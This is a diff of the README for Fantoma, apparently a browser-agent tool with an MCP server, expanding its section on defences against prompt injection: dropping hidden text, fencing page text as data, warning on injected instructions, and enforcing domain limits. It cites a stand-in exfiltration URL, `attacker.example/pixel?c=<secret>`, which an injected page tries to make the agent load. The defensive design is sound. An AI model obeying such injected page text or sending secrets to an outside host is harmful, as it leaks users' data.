@@ -66,7 +66,7 @@ python -m camoufox fetch        # optional: download the browser now, not on the
 claude mcp add fantoma -- fantoma-mcp
 ```
 
-With nothing else configured, the MCP server runs the browser itself. `fantoma_read` and `fantoma_login` need no LLM. `fantoma_run` and `fantoma_extract` need one, which you point at with environment variables:
+With nothing else configured, the MCP server runs the browser itself. (If a Fantoma Docker backend is already answering on `127.0.0.1:7860`, it uses that instead, so existing setups keep working. `FANTOMA_MCP_BACKENDS=local` forces the built-in browser.) `fantoma_read` and `fantoma_login` need no LLM. `fantoma_run` and `fantoma_extract` need one, which you point at with environment variables:
 
 ```bash
 claude mcp add fantoma \
@@ -113,7 +113,7 @@ A browser agent reads text written by strangers, and some of it is written for t
 - **Hidden text never reaches the model.** Page text is rendered from what a person can see. `display:none`, `visibility:hidden`, `opacity:0`, `aria-hidden`, zero-size, clipped and far-off-screen text is dropped, and so are zero-width and bidi-control characters. That is where injected instructions usually hide.
 - **Page text is fenced.** Everything page-sourced that goes to a model sits inside `<untrusted_web_content id="…">` with a random id the page cannot guess, so it cannot close the fence early and pose as the user. Every system prompt says fenced text is data.
 - **Suspicious text is reported.** `read()` returns `injection_warnings`, excerpts that read like instructions aimed at an AI. It is a tripwire for you to look at, not a filter.
-- **Domain limits are enforced by the browser.** `Fantoma(allowed_domains=["example.com"])` or `FANTOMA_ALLOWED_DOMAINS` aborts every request to any other host: navigations, frames, scripts, images and fetch calls. A page that talks the agent into loading `attacker.example/pixel?c=<secret>` sends nothing. `blocked_domains` does the reverse.
+- **Domain limits are enforced by the browser.** `Fantoma(allowed_domains=["example.com"])` or `FANTOMA_ALLOWED_DOMAINS` aborts every request to any other host: navigations, frames, scripts, images, fetch calls, redirects and WebSockets. A page that talks the agent into loading `attacker.example/pixel?c=<secret>` sends nothing. `blocked_domains` does the reverse. To see where a redirect goes before following it, requests are fetched through Playwright's own network client while a policy is on, so their network fingerprint is not the browser's. `FANTOMA_DOMAIN_STRICT=0` keeps the browser's networking and gives up redirect checking; a page that ends up on a forbidden host is still left immediately and never read. WebSockets opened inside web workers are not covered.
 - **Credentials stay out of prompts.** `sensitive_data={"password": "..."}` shows the model `<secret:password>` and substitutes the real value only when typing.
 - **Block pages are named.** A "Just a moment..." interstitial, a captcha, a 403 or a login wall comes back as `blocked: "bot_challenge"` and so on, instead of being summarised as if it were the page you asked for.
 
